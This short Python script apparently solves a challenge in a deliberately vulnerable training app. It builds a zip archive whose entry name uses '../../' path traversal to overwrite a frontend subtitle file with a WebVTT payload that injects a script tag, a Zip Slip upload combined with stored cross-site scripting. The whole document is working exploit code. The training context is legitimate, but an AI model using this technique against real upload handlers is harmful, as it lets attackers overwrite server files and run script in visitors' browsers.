import zipfile

payload = """WEBVTT

00:00:00.000 --> 00:00:05.000
</script><script>alert(`xss`)</script>
"""

target = "../../frontend/dist/frontend/assets/public/videos/owasp_promo.vtt"

with zipfile.ZipFile("exploit.zip", "w") as z:
    z.writestr(target, payload)

print("exploit.zip created!")